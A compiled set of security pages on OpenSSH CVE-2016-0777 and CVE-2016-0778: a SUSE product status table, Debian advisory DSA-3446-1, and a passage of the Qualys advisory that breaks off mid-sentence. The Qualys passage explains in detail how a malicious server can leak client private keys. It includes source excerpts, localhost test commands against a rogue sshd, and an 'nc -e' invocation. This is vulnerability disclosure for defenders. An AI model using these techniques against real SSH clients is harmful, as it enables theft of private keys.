* [amazon/suse-sles-sap-15-sp3-byos-v20210924-hvm-ssd-x86\_64](https://publiccloudimagechangeinfo.suse.com/amazon/suse-sles-sap-15-sp3-byos-v20210924-hvm-ssd-x86_64)
* [google/sles-15-sp3-byos-v20210812](https://publiccloudimagechangeinfo.suse.com/google/sles-15-sp3-byos-v20210812)
* [google/sles-15-sp3-chost-byos-v20210729](https://publiccloudimagechangeinfo.suse.com/google/sles-15-sp3-chost-byos-v20210729)
* [google/sles-15-sp3-chost-byos-v20210827](https://publiccloudimagechangeinfo.suse.com/google/sles-15-sp3-chost-byos-v20210827)
* [google/sles-15-sp3-sap-byos-v20210812](https://publiccloudimagechangeinfo.suse.com/google/sles-15-sp3-sap-byos-v20210812)
* [google/sles-15-sp3-sap-v20210812](https://publiccloudimagechangeinfo.suse.com/google/sles-15-sp3-sap-v20210812)
* [google/sles-15-sp3-sapcal-v20210812](https://publiccloudimagechangeinfo.suse.com/google/sles-15-sp3-sapcal-v20210812)
* [google/sles-15-sp3-v20210812](https://publiccloudimagechangeinfo.suse.com/google/sles-15-sp3-v20210812)
* [google/suse-manager-4-2-proxy-byos-v20210812](https://publiccloudimagechangeinfo.suse.com/google/suse-manager-4-2-proxy-byos-v20210812)
* [google/suse-manager-4-2-server-byos-v20210812](https://publiccloudimagechangeinfo.suse.com/google/suse-manager-4-2-server-byos-v20210812)
* [microsoft/suse-manager-4-2-proxy-byos-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-manager-4-2-proxy-byos-v20210924)
* [microsoft/suse-manager-4-2-server-byos-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-manager-4-2-server-byos-v20210924)
* [microsoft/suse-sles-15-sp3-basic-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-basic-v20210924)
* [microsoft/suse-sles-15-sp3-byos-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-byos-v20210924)
* [microsoft/suse-sles-15-sp3-chost-byos-v20210729](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-chost-byos-v20210729)
* [microsoft/suse-sles-15-sp3-chost-byos-v20210827](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-chost-byos-v20210827)
* [microsoft/suse-sles-15-sp3-hpc-byos-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-hpc-byos-v20210924)
* [microsoft/suse-sles-15-sp3-hpc-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-hpc-v20210924)
* [microsoft/suse-sles-15-sp3-sapcal-v20220120](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-sapcal-v20220120)
* [microsoft/suse-sles-15-sp3-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-15-sp3-v20210924)
* [microsoft/suse-sles-sap-15-sp3-byos-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-sap-15-sp3-byos-v20210924)
* [microsoft/suse-sles-sap-15-sp3-v20210924](https://publiccloudimagechangeinfo.suse.com/microsoft/suse-sles-sap-15-sp3-v20210924)

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products past their end of life and not receiving proactive updates anymore. | | |
| SUSE Linux Enterprise Desktop 11 SP2 | openssh | Not affected |
| SUSE Linux Enterprise Desktop 11 SP3 | openssh | Released |
| SUSE Linux Enterprise Desktop 11 SP3 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Desktop 11 SP4 | openssh | Released |
| SUSE Linux Enterprise Desktop 11 SP4 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Desktop 12 | openssh | Released |
| SUSE Linux Enterprise Desktop 12 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Desktop 12 SP1 | openssh | Released |
| SUSE Linux Enterprise Desktop 12 SP1 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Point of Sale 11 SP3 | openssh | Affected |
| SUSE Linux Enterprise Point of Service 11 SP3 | openssh | Unsupported |
| SUSE Linux Enterprise Server 11 SP1-LTSS | openssh | Not affected |
| SUSE Linux Enterprise Server 11 SP2 | openssh | Not affected |
| SUSE Linux Enterprise Server 11 SP2-LTSS | openssh | Not affected |
| SUSE Linux Enterprise Server 11 SP3 | openssh | Released |
| SUSE Linux Enterprise Server 11 SP3 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 11 SP3-LTSS | openssh | Released |
| SUSE Linux Enterprise Server 11 SP4 | openssh | Released |
| SUSE Linux Enterprise Server 11 SP4 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 11 SP4 LTSS | openssh | Affected |
| SUSE Linux Enterprise Server 11 SP4-LTSS | openssh | Released |
| SUSE Linux Enterprise Server 11-SECURITY | openssh-openssl1 | Released |
| SUSE Linux Enterprise Server 12 | openssh | Released |
| SUSE Linux Enterprise Server 12 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 12 SP1 | openssh | Released |
| SUSE Linux Enterprise Server 12 SP1 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server 12 SP1-LTSS | openssh | Released |
| SUSE Linux Enterprise Server 12-LTSS | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP3 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP3 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP4 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 11 SP4 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 | openssh-askpass-gnome | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP1 | openssh | Released |
| SUSE Linux Enterprise Server for SAP Applications 12 SP1 | openssh-askpass-gnome | Released |
| Security Module for SUSE Linux Enterprise 11 | openssh-openssl1 | Released |

---

### SUSE Timeline for this CVE

CVE page created: Wed Jan 13 11:21:18 2016

CVE page last modified: Tue Dec 17 20:11:02 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from h20566.www2.hpe.com_54e1d0d9_20250125_234742.html ===




=== Content from www.debian.org_f83fed95_20250125_234725.html ===


---

[[Date Prev](msg00014.html)][[Date Next](msg00016.html)]
[[Thread Prev](msg00014.html)][[Thread Next](msg00016.html)]
[[Date Index](maillist.html#00015)]
[[Thread Index](threads.html#00015)]

# [SECURITY] [DSA 3446-1] openssh security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 3446-1] openssh security update
* *From*: Yves-Alexis Perez <corsac@debian.org>
* *Date*: Thu, 14 Jan 2016 16:57:57 +0100
* *Message-id*: <[[🔎]](/msgid-search/20160114155755.GA28404%40scapa.corsac.net) [20160114155755.GA28404@scapa.corsac.net](msg00015.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-3446-1                   security@debian.org
<https://www.debian.org/security/>                        Yves-Alexis Perez
January 14, 2016                      <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : openssh
CVE ID         : CVE-2016-0777 CVE-2016-0778
Debian bug     : 810984

The Qualys Security team discovered two vulnerabilities in the roaming
code of the OpenSSH client (an implementation of the SSH protocol
suite).

SSH roaming enables a client, in case an SSH connection breaks
unexpectedly, to resume it at a later time, provided the server also
supports it.

The OpenSSH server doesn't support roaming, but the OpenSSH client
supports it (even though it's not documented) and it's enabled by
default.

CVE-2016-0777

    An information leak (memory disclosure) can be exploited by a rogue
    SSH server to trick a client into leaking sensitive data from the
    client memory, including for example private keys.

CVE-2016-0778

    A buffer overflow (leading to file descriptor leak), can also be
    exploited by a rogue SSH server, but due to another bug in the code
    is possibly not exploitable, and only under certain conditions (not
    the default configuration), when using ProxyCommand, ForwardAgent or
    ForwardX11.

This security update completely disables the roaming code in the OpenSSH
client.

It is also possible to disable roaming by adding the (undocumented)
option 'UseRoaming no' to the global /etc/ssh/ssh_config file, or to the
user configuration in ~/.ssh/config, or by passing -oUseRoaming=no on
the command line.

Users with passphrase-less privates keys, especially in non interactive
setups (automated jobs using ssh, scp, rsync+ssh etc.) are advised to
update their keys if they have connected to an SSH server they don't
trust.

More details about identifying an attack and mitigations will be
available in the Qualys Security Advisory.

For the oldstable distribution (wheezy), these problems have been fixed
in version 1:6.0p1-4+deb7u3.

For the stable distribution (jessie), these problems have been fixed in
version 1:6.7p1-5+deb8u1.

For the testing distribution (stretch) and unstable distribution (sid), these
problems will be fixed in a later version.

We recommend that you upgrade your openssh packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQEcBAEBCgAGBQJWl8KkAAoJEG3bU/KmdcClRNwH/0VVHlie4NzyktneCUYnPuU2
WpeiJLScW+Sgn9ZfaL4LD+RlvmH19YLaKirIula1Wp+f6poAAMrE+Zh2ZO6wH1XY
C3VG9mA3sZDkrgctKVqQ0jO9oY0kFsN8FbNduFH/qBycLZdsH6nQ1KyWRDuKfVql
4qJCoErmsc9w/Avlh/+WE7JFDRA+2TcGuXeHbmuSaxHAbR8+2PZ+4Z5xgUG/i7P2
KeQkFTHBewn0fBQsQxIAgkwvV58eKNScGcgEMBrwKcwxcXDmWg4ST8KQLLZ+oQct
mF1xWkNAnGNk6yfiGScv6TlY2JtVgfTTNN3gYjpbe/W4Wbqwp7xML90DRPzG7WQ=
=MOdR
-----END PGP SIGNATURE-----

```

---



=== Content from h20566.www2.hpe.com_fcf76f9e_20250125_234745.html ===


[**Support Center**](/connect/s/)



=== Content from seclists.org_26a61c64_20250125_234725.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](43)
[By Date](date.html#44)
[![Next](/images/right-icon-16x16.png)](45)

[![Previous](/images/left-icon-16x16.png)](43)
[By Thread](index.html#44)
[![Next](/images/right-icon-16x16.png)](45)

![](/shared/images/nst-icons.svg#search)

# Qualys Security Advisory - Roaming through the OpenSSH client: CVE-2016-0777 and CVE-2016-0778

---

*From*: Qualys Security Advisory <qsa () qualys com>

*Date*: Thu, 14 Jan 2016 09:49:53 -0800

---

```

Qualys Security Advisory

Roaming through the OpenSSH client: CVE-2016-0777 and CVE-2016-0778

========================================================================
Contents
========================================================================

Summary
Information Leak (CVE-2016-0777)
- Analysis
- Private Key Disclosure
- Mitigating Factors
- Examples
Buffer Overflow (CVE-2016-0778)
- Analysis
- Mitigating Factors
- File Descriptor Leak
Acknowledgments
Proof Of Concept

========================================================================
Summary
========================================================================

Since version 5.4 (released on March 8, 2010), the OpenSSH client
supports an undocumented feature called roaming: if the connection to an
SSH server breaks unexpectedly, and if the server supports roaming as
well, the client is able to reconnect to the server and resume the
suspended SSH session.

Although roaming is not supported by the OpenSSH server, it is enabled
by default in the OpenSSH client, and contains two vulnerabilities that
can be exploited by a malicious SSH server (or a trusted but compromised
server): an information leak (memory disclosure), and a buffer overflow
(heap-based).

The information leak is exploitable in the default configuration of the
OpenSSH client, and (depending on the client's version, compiler, and
operating system) allows a malicious SSH server to steal the client's
private keys. This information leak may have already been exploited in
the wild by sophisticated attackers, and high-profile sites or users may
need to regenerate their SSH keys accordingly.

The buffer overflow, on the other hand, is present in the default
configuration of the OpenSSH client but its exploitation requires two
non-default options: a ProxyCommand, and either ForwardAgent (-A) or
ForwardX11 (-X). This buffer overflow is therefore unlikely to have any
real-world impact, but provides a particularly interesting case study.

All OpenSSH versions between 5.4 and 7.1 are vulnerable, but can be
easily hot-fixed by setting the undocumented option "UseRoaming" to
"no", as detailed in the Mitigating Factors section. OpenSSH version
7.1p2 (released on January 14, 2016) disables roaming by default.

========================================================================
Information Leak (CVE-2016-0777)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

If the OpenSSH client connects to an SSH server that offers the key
exchange algorithm "resume () appgate com", it sends the global request
"roaming () appgate com" to the server, after successful authentication. If
this request is accepted, the client allocates a roaming buffer out_buf,
by calling malloc() (and not calloc()) with an out_buf_size that is
arbitrarily chosen by the server:

 63 void
 64 roaming_reply(int type, u_int32_t seq, void *ctxt)
 65 {
 66         if (type == SSH2_MSG_REQUEST_FAILURE) {
 67                 logit("Server denied roaming");
 68                 return;
 69         }
 70         verbose("Roaming enabled");
 ..
 75         set_out_buffer_size(packet_get_int() + get_snd_buf_size());
 ..
 77 }

 40 static size_t out_buf_size = 0;
 41 static char *out_buf = NULL;
 42 static size_t out_start;
 43 static size_t out_last;
 ..
 75 void
 76 set_out_buffer_size(size_t size)
 77 {
 78         if (size == 0 || size > MAX_ROAMBUF)
 79                 fatal("%s: bad buffer size %lu", __func__, (u_long)size);
 80         /*
 81          * The buffer size can only be set once and the buffer will live
 82          * as long as the session lives.
 83          */
 84         if (out_buf == NULL) {
 85                 out_buf_size = size;
 86                 out_buf = xmalloc(size);
 87                 out_start = 0;
 88                 out_last = 0;
 89         }
 90 }

The OpenSSH client's roaming_write() function, a simple wrapper around
write(), calls wait_for_roaming_reconnect() to transparently reconnect
to the SSH server after a disconnection. It also calls buf_append() to
copy the data sent to the server into the roaming buffer out_buf. During
a reconnection, the client is therefore able to resend the data that was
not received by the server because of the disconnection:

198 void
199 resend_bytes(int fd, u_int64_t *offset)
200 {
201         size_t available, needed;
202
203         if (out_start < out_last)
204                 available = out_last - out_start;
205         else
206                 available = out_buf_size;
207         needed = write_bytes - *offset;
208         debug3("resend_bytes: resend %lu bytes from %llu",
209             (unsigned long)needed, (unsigned long long)*offset);
210         if (needed > available)
211                 fatal("Needed to resend more data than in the cache");
212         if (out_last < needed) {
213                 int chunkend = needed - out_last;
214                 atomicio(vwrite, fd, out_buf + out_buf_size - chunkend,
215                     chunkend);
216                 atomicio(vwrite, fd, out_buf, out_last);
217         } else {
218                 atomicio(vwrite, fd, out_buf + (out_last - needed), needed);
219         }
220 }

In the OpenSSH client's roaming buffer out_buf, the most recent data
sent to the server begins at index out_start and ends at index out_last.
As soon as this circular buffer is full, buf_append() maintains the
invariant "out_start = out_last + 1", and consequently three different
cases have to be considered:

- "out_start < out_last" (lines 203-204): out_buf is not full yet (and
  out_start is still equal to 0), and the amount of data available in
  out_buf is indeed "out_last - out_start";

- "out_start > out_last" (lines 205-206): out_buf is full (and out_start
  is exactly equal to "out_last + 1"), and the amount of data available
  in out_buf is indeed the entire out_buf_size;

- "out_start == out_last" (lines 205-206): no data was ever written to
  out_buf (and both out_start and out_last are still equal to 0) because
  no data was ever sent to the server after roaming_reply() was called,
  but the client sends (leaks) the entire uninitialized out_buf to the
  server (line 214), as if out_buf_size bytes of data were available.

In order to successfully exploit this information leak and retrieve
sensitive information from the OpenSSH client's memory (for example,
private SSH keys, or memory addresses useful for further exploitation),
a malicious server needs to:

- Massage the client's heap before roaming_reply() malloc()ates out_buf,
  and force malloc() to return a previously free()d but uncleansed chunk
  of sensitive information. The simple proof-of-concept in this advisory
  does not implement heap massaging.

- Guess the client's get_snd_buf_size() in order to precisely control
  out_buf_size. OpenSSH < 6.0 accepts out_buf sizes in the range (0,4G),
  and OpenSSH >= 6.0 accepts sizes in the range (0,2M]. Sizes smaller
  than get_snd_buf_size() are attainable because roaming_reply() does
  not protect "packet_get_int() + get_snd_buf_size()" against integer
  wraparound. The proof-of-concept in this advisory attempts to derive
  the client's get_snd_buf_size() from the get_recv_buf_size() sent by
  the client to the server, and simply chooses a random out_buf_size.

- Advise the client's resend_bytes() that all "available" bytes (the
  entire out_buf_size) are "needed" by the server, even if fewer bytes
  were actually written by the client to the server (because the server
  controls the "*offset" argument, and resend_bytes() does not protect
  "needed = write_bytes - *offset" against integer wraparound).

Finally, a brief digression on a minor bug in resend_bytes(): on 64-bit
systems, where "chunkend" is a 32-bit signed integer, but "out_buf" and
"out_buf_size" are 64-bit variables, "out_buf + out_buf_size - chunkend"
may point out-of-bounds, if chunkend is negative (if out_buf_size is in
the [2G,4G) range). This negative chunkend is then converted to a 64-bit
size_t greater than SSIZE_MAX when passed to atomicio(), and eventually
returns EFAULT when passed to write() (at least on Linux and OpenBSD),
thus avoiding an out-of-bounds read from the OpenSSH client's memory.

------------------------------------------------------------------------
Private Key Disclosure
------------------------------------------------------------------------

We initially believed that this information leak in the OpenSSH client's
roaming code would not allow a malicious SSH server to steal the
client's private keys, because:

- the information leaked is not read from out-of-bounds memory, but from
  a previously free()d chunk of memory that is recycled to malloc()ate
  the client's roaming buffer out_buf;

- private keys are loaded from disk into memory and freed by key_free()
  (old API, OpenSSH < 6.7) or sshkey_free() (new API, OpenSSH >= 6.7),
  and both functions properly cleanse the private keys' memory with
  OPENSSL_cleanse() or explicit_bzero();

- temporary copies of in-memory private keys are freed by buffer_free()
  (old API) or sshbuf_free() (new API), and both functions attempt to
  cleanse these copies with memset() or bzero().

However, we eventually identified three reasons why, in our experiments,
we were able to partially or completely retrieve the OpenSSH client's
private keys through this information leak (depending on the client's
version, compiler, operating system, heap layout, and private keys):

(besides these three reasons, other reasons may exist, as suggested by
the CentOS and Fedora examples at the end of this section)

1. If a private SSH key is loaded from disk into memory by fopen() (or
fdopen()), fgets(), and fclose(), a partial or complete copy of this
private key may remain uncleansed in memory. Indeed, these functions
manage their own internal buffers, and whether these buffers are
cleansed or not depends on the OpenSSH client's libc (stdio)
implementation, but not on OpenSSH itself.

- In all vulnerable OpenSSH versions, SSH's main() function calls
  load_public_identity_files(), which loads the client's public keys
  with fopen(), fgets(), and fclose(). Unfortunately, the private keys
  (without the ".pub" suffix) are loaded first and then discarded, but
  nonetheless buffered in memory by the stdio functions.

- In OpenSSH versions <= 5.6, the load_identity_file() function (called
  by the client's public-key authentication method) loads a private key
  with fdopen() and PEM_read_PrivateKey(), an OpenSSL function that uses
  fgets() and hence internal stdio buffering.

Internal stdio buffering is the most severe of the three problems
discussed in this section, although GNU/Linux is not affected because
the glibc mmap()s and munmap()s (and therefore cleanses) stdio buffers.
BSD-based systems, on the other hand, are severely affected because they
simply malloc()ate and free() stdio buffers. For interesting comments on
this issue:

[https://www.securecoding.cert.org/confluence/display/c/MEM06-C.+Ensure+that+sensitive+data+is+not+written+out+to+disk](https://www.securecoding.cert.org/confluence/display/c/MEM06-C.%2BEnsure%2Bthat%2Bsensitive%2Bdata%2Bis%2Bnot%2Bwritten%2Bout%2Bto%2Bdisk)

2. In OpenSSH versions >= 5.9, the client's load_identity_file()
function (called by the public-key authentication method) read()s a
private key in 1024-byte chunks that are appended to a growing buffer (a
realloc()ating buffer) with buffer_append() (old API) or sshbuf_put()
(new API). Unfortunately, the repeated calls to realloc() may leave
partial copies of the private key uncleansed in memory.

- In OpenSSH < 6.7 (old API), the initial size of such a growing buffer
  is 4096 bytes: if a private-key file is larger than 4K, a partial copy
  of this private key may remain uncleansed in memory (a 3K copy in a 4K
  buffer). Fortunately, only the file of a very large RSA key (for
  example, an 8192-bit RSA key) can exceed 4K.

- In OpenSSH >= 6.7 (new API), the initial size of a growing buffer is
  256 bytes: if a private-key file is larger than 1K (the size passed to
  read()), a partial copy of this private key may remain uncleansed in
  memory (a 1K copy in a 1K buffer). For example, the file of a
  default-sized 2048-bit RSA key exceeds 1K.

For more information on this issue:

[https://www.securecoding.cert.org/confluence/display/c/MEM03-C.+Clear+sensitive+information+stored+in+reusable+resources](https://www.securecoding.cert.org/confluence/display/c/MEM03-C.%2BClear%2Bsensitive%2Binformation%2Bstored%2Bin%2Breusable%2Bresources)

<https://cwe.mitre.org/data/definitions/244.html>

3. An OpenSSH growing-buffer that holds a private key is eventually
freed by buffer_free() (old API) or sshbuf_free() (new API), and both
functions attempt to cleanse the buffer with memset() or bzero() before
they call free(). Unfortunately, an optimizing compiler may remove this
memset() or bzero() call, because the buffer is written to, but never
again read from (an optimization known as Dead Store Elimination).

OpenSSH 6.6 is the only version that is not affected, because it calls
explicit_bzero() instead of memset() or bzero().

Dead Store Elimination is the least severe of the three problems
explored in this section, because older GCC versions do not remove the
memset() or bzero() call made by buffer_free() or sshbuf_free(). GCC 5
and Clang/LLVM do, however, remove it. For detailed discussions of this
issue:

[https://www.securecoding.cert.org/confluence/display/c/MSC06-C.+Beware+of+compiler+optimizations](https://www.securecoding.cert.org/confluence/display/c/MSC06-C.%2BBeware%2Bof%2Bcompiler%2Boptimizations)

<https://cwe.mitre.org/data/definitions/14.html>

<https://sourceware.org/ml/libc-alpha/2014-12/threads.html#00506>

Finally, for these three reasons, passphrase-encrypted SSH keys are
leaked in their encrypted form, but an attacker may attempt to crack the
passphrase offline. On the other hand, SSH keys that are available only
through an authentication agent are never leaked, in any form.

------------------------------------------------------------------------
Mitigating Factors
------------------------------------------------------------------------

This information leak affects all OpenSSH clients >= 5.4, but its impact
is slightly reduced by the following four reasons:

1. The vulnerable roaming code can be permanently disabled by adding the
undocumented option "UseRoaming no" to the system-wide configuration
file (usually /etc/ssh/ssh_config), or per-user configuration file
(~/.ssh/config), or command-line (-o "UseRoaming no").

2. If an OpenSSH client is disconnected from an SSH server that offers
roaming, it prints "[connection suspended, press return to resume]" on
stderr, and waits for '\n' or '\r' on stdin (and not on the controlling
terminal) before it reconnects to the server; advanced users may become
suspicious and press Control-C or Control-Z instead, thus avoiding the
information leak:

# "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume]^Z
[1]+  Stopped                 /usr/bin/ssh -p 222 127.0.0.1

However, SSH commands that use the local stdin to transfer data to the
remote server are bound to trigger this reconnection automatically (upon
reading a '\n' or '\r' from stdin). Moreover, these non-interactive SSH
commands (for example, backup scripts and cron jobs) commonly employ
public-key authentication and are therefore perfect targets for this
information leak:

$ ls -l /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 "cat > /tmp/passwd.ls"
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]

$ tar -cf - /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 "cat > /tmp/passwd.tar"
tar: Removing leading `/' from member names
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
...
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]

Similarly, the SCP client uses the SSH client's stdin and stdout to
transfer data, and can be forced by a malicious SSH server to output a
control record that ends in '\n' (an error message in server-to-client
mode, or file permissions in client-to-server mode); this '\n' is then
read from stdin by the fgetc() call in wait_for_roaming_reconnect(), and
triggers an automatic reconnection that allows the information leak to
be exploited without user interaction:

# env ROAMING="scp_mode sleep:1" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null
-h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/scp -P 222 127.0.0.1:/etc/passwd /tmp
$ [connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]

$ /usr/bin/scp -P 222 /etc/passwd 127.0.0.1:/tmp
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]
lost connection

3. Although a man-in-the-middle attacker can reset the TCP connection
between an OpenSSH client and an OpenSSH server (which does not support
roaming), it cannot exploit the information leak without breaking server
host authentication or integrity protection, because it needs to:

- first, append the "resume () appgate com" algorithm name to the server's
  initial key exchange message;

- second, in response to the client's "roaming () appgate com" request,
  change the server's reply from failure to success.

In conclusion, an attacker who wishes to exploit this information leak
must convince its target OpenSSH client to connect to a malicious server
(an unlikely scenario), or compromise a trusted server (a more likely
scenario, for a determined attacker).

4. We discovered several non-security bugs, in specific versions and
configurations of OpenSSH, that prevent the client's roaming code from
reconnecting to the server and, as a result, prevent this information
leak from being exploited. In the client, wait_for_roaming_reconnect()
calls ssh_connect(), the same function that successfully established the
first connection to the server; this function supports four different
connection methods, but each method contains a bug and may fail to
establish a second connection to the server:

- In OpenSSH >= 6.5 (released on January 30, 2014), the default
  ssh_connect_direct() method (a simple TCP connection) is called by
  wait_for_roaming_reconnect() with a NULL aitop argument, which makes
  it impossible for the client to reconnect to the server:

 418 static int
 419 ssh_connect_direct(const char *host, struct addrinfo *aitop,
 ...
 424         int sock = -1, attempt;
 425         char ntop[NI_MAXHOST], strport[NI_MAXSERV];
 ...
 430         for (attempt = 0; attempt < connection_attempts; attempt++) {
 ...
 440                 for (ai = aitop; ai; ai = ai->ai_next) {
 ...
 470                 }
 471                 if (sock != -1)
 472                         break;  /* Successful connection. */
 473         }
 474
 475         /* Return failure if we didn't get a successful connection. */
 476         if (sock == -1) {
 477                 error("ssh: connect to host %s port %s: %s",
 478                     host, strport, strerror(errno));
 479                 return (-1);
 480         }

  Incidentally, this error() call displays stack memory from the
  uninitialized strport[] array, a byproduct of the NULL aitop:

$ /usr/bin/ssh -V
OpenSSH_6.8, LibreSSL 2.1

$ /usr/bin/ssh -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file
descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor

- The special ProxyCommand "-" communicates with the server through the
  client's stdin and stdout, but these file descriptors are close()d by
  packet_backup_state() at the beginning of wait_for_roaming_reconnect()
  and are never reopened again, making it impossible for the client to
  reconnect to the server. Moreover, the fgetc() that waits for '\n' or
  '\r' on the closed stdin returns EOF and forces the client to exit():

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ /usr/bin/nc -e "/usr/bin/ssh -o ProxyCommand=- -p 222 127.0.0.1" 127.0.0.1 222
Pseudo-terminal will not be allocated because stdin is not a terminal.
user@127.0.0.1's password:
[connection suspended, press return to resume][exiting]

- The method ssh_proxy_fdpass_connect() fork()s a ProxyCommand that
  passes a connected file descriptor back to the client, but it calls
  fatal() while reconnecting to the server, because waitpid() returns
  ECHILD; indeed, the SIGCHLD handler (installed by SSH's main() after
  the first successful connection to the server) calls waitpid() before
  ssh_proxy_fdpass_connect() does:

1782 static void
1783 main_sigchld_handler(int sig)
1784 {
....
1789         while ((pid = waitpid(-1, &status, WNOHANG)) > 0 ||
1790             (pid < 0 && errno == EINTR))
1791                 ;
1792
1793         signal(sig, main_sigchld_handler);
....
1795 }

 101 static int
 102 ssh_proxy_fdpass_connect(const char *host, u_short port,
 103     const char *proxy_command)
 104 {
 ...
 121         /* Fork and execute the proxy command. */
 122         if ((pid = fork()) == 0) {
 ...
 157         }
 158         /* Parent. */
 ...
 167         while (waitpid(pid, NULL, 0) == -1)
 168                 if (errno != EINTR)
 169                         fatal("Couldn't wait for child: %s", strerror(errno));

$ /usr/bin/ssh -V
OpenSSH_6.6.1p1, OpenSSL 1.0.1p-freebsd 9 Jul 2015

$ /usr/bin/ssh -o ProxyUseFdpass=yes -o ProxyCommand="/usr/bin/nc -F %h %p" -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume]Couldn't wait for child: No child processes

- The method ssh_proxy_connect() fork()s a standard ProxyCommand that
